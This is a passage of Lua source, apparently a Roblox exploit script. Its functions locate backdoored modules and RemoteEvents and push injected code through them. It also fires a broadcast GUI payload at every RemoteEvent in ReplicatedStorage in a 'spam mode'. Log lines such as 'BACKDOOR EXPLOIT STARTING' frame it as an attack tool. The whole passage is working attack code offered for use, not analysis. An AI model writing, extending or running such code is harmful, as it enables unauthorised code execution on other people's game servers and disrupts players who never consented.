    ]], message, duration or 10)
end

local function ExploitModuleBackdoor(module, code)
    pcall(function()
        local req = require(module)
        if type(req) == "function" then
            req(code)
            addLog("ğŸ”¥ Module executed: " .. module.Name, Color3.fromRGB(255, 150, 50))
        elseif type(req) == "table" then
            if req.run then req.run(code) end
            if req.Execute then req.Execute(code) end
            addLog("ğŸ”¥ Table executed: " .. module.Name, Color3.fromRGB(255, 150, 50))
        end
    end)
end

local function BackdoorBroadcast(message, duration)
    addLog("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•", Color3.fromRGB(255, 255, 255))
    addLog("ğŸ’‰ BACKDOOR EXPLOIT STARTING...", Color3.fromRGB(255, 100, 100))
    updateStatus("Exploiting backdoors...", Color3.fromRGB(255, 200, 100))
    
    local backdoors = FindBackdoors()
    local guiCode = GetBroadcastGUICode(message, duration or 10)
    local successCount = 0
    
    for _, backdoor in pairs(backdoors) do
        if backdoor.Type == "Module" then
            ExploitModuleBackdoor(backdoor.Object, guiCode)
            successCount = successCount + 1
        elseif backdoor.Type == "Remote" then
            pcall(function()
                backdoor.Object:FireServer(guiCode)
                backdoor.Object:FireServer("Broadcast", guiCode)
                addLog("ğŸ”¥ Remote fired: " .. backdoor.Object.Name, Color3.fromRGB(255, 100, 150))
            end)
            successCount = successCount + 1
        end
        wait(0.05)
    end
    
    addLog("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•", Color3.fromRGB(255, 255, 255))
    addLog("âœ… Exploited " .. successCount .. " backdoors!", Color3.fromRGB(100, 255, 100))
    updateStatus("Complete!", Color3.fromRGB(100, 255, 100))
    
    return successCount > 0
end

local function SpamAllRemotes(message, duration)
    addLog("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•", Color3.fromRGB(255, 255, 255))
    addLog("ğŸ’¥ SPAM MODE ACTIVATED!", Color3.fromRGB(255, 50, 150))
    updateStatus("Spamming...", Color3.fromRGB(255, 100, 255))
    
    local guiCode = GetBroadcastGUICode(message, duration or 10)
    local remotes = {}
    
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then table.insert(remotes, obj) end
    end
    
    addLog("Found " .. #remotes .. " RemoteEvents", Color3.fromRGB(255, 200, 100))
    
    for i, remote in pairs(remotes) do
        task.spawn(function()
            pcall(function()
                remote:FireServer(guiCode)
                remote:FireServer("broadcast", message, guiCode)
            end)
        end)
    end
    
    addLog("âœ… Spam complete!", Color3.fromRGB(100, 255, 100))
    updateStatus("Spam complete!", Color3.fromRGB(100, 255, 100))
end

